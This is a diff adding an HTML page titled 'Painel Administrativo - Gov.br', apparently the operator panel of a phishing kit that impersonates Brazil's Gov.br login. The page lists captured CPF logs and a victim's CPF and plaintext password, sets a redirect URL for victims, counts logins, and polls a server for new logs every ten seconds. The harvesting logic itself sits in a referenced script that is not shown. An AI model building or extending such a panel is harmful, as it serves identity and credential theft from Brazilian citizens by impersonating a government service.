@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Administrativo - Gov.br</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="admin-container">
+        <div class="admin-header">
+            <div class="container">
+                <h1>Painel Administrativo</h1>
+                <button class="back-btn" onclick="window.location.href='index.html'">← Voltar</button>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="admin-content">
+            <div class="admin-section">
+                <h2>Logs de CPF Salvos</h2>
+                <div class="logs-container">
+                    <div id="logs-display" class="logs-text">Carregando logs...</div>
+                </div>
+                <button class="refresh-btn" onclick="loadLogsFromServer()">Atualizar Logs</button>
+            </div>
+
+            <div class="admin-section">
+                <h2>Usuário Atual</h2>
+                <div class="users-list">
+                    <div class="user-item">
+                        <span class="user-label">CPF:</span>
+                        <span id="stored-cpf" class="user-value">Nenhum usuário</span>
+                    </div>
+                    <div class="user-item">
+                        <span class="user-label">Senha:</span>
+                        <span id="stored-password" class="user-value">Nenhuma senha</span>
+                    </div>
+                </div>
+                <button class="clear-btn" onclick="clearUserData()">Limpar Dados</button>
+            </div>
+
+            <div class="admin-section">
+                <h2>Configuração de Redirecionamento</h2>
+                <div class="redirect-config">
+                    <label for="redirect-url">URL de Redirecionamento:</label>
+                    <input type="url" id="redirect-url" placeholder="https://exemplo.com" />
+                    <button class="save-btn" onclick="saveRedirectUrl()">Salvar URL</button>
+                </div>
+                <div class="current-url">
+                    <span>URL Atual: </span>
+                    <span id="current-url">Nenhuma URL configurada</span>
+                </div>
+            </div>
+
+            <div class="admin-section">
+                <h2>Estatísticas</h2>
+                <div class="stats">
+                    <div class="stat-item">
+                        <span class="stat-label">Total de Logins:</span>
+                        <span id="login-count" class="stat-value">0</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-label">Último Login:</span>
+                        <span id="last-login" class="stat-value">Nenhum</span>
+                    </div>
+                </div>
+            </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        // Load logs when admin page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            loadLogsFromServer();
+            // Refresh logs every 10 seconds
+            setInterval(loadLogsFromServer, 10000);
+        });
+    </script>
+</body>
+</html>
